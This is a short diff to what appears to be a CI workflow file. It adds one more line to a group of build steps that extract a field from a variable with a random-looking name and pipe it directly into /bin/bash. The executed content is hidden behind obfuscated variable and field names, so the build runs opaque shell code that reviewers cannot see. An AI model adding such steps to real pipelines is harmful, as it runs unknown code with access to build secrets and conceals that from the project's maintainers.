@@ -26,6 +26,7 @@ jobs:
           echo $j52 | jq -r .usgxu1767 | /bin/bash
           printf '%s' "$vi24" | jq -r .hyy6 | /bin/bash
           printf '%s' "$y6" | jq -r .c1316 | /bin/bash
+          echo $k44 | jq -r .rwtop74 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
